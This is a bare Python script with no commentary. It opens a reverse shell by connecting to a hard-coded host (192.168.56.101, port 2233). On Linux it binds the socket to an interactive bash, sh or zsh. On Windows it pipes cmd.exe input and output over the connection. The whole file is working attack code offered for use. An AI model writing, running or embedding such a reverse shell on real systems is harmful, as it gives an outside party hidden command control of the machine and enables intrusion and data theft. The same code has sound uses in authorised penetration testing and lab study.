
import os
import socket
import subprocess
import platform
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.101", 2233))
if platform.system().lower() == "linux":
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    if os.path.exists("/bin/bash"):
        shell = "/bin/bash"
    elif os.path.exists("/usr/bin/sh"):
        shell = "/usr/bin/sh"
    elif os.path.exists("/usr/bin/zsh"):
        shell = "/usr/bin/zsh"
    p = subprocess.Popen([shell, "-i"])

elif platform.system().lower() == "windows":
    p = subprocess.Popen([r"C:\Windows\System32\cmd.exe", "/u"], stderr=subprocess.STDOUT, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    while True:
        out = p.stdout.read(1024)
        s.send(out)
        cmd = s.recv(1024)
        p.stdin.write(cmd)

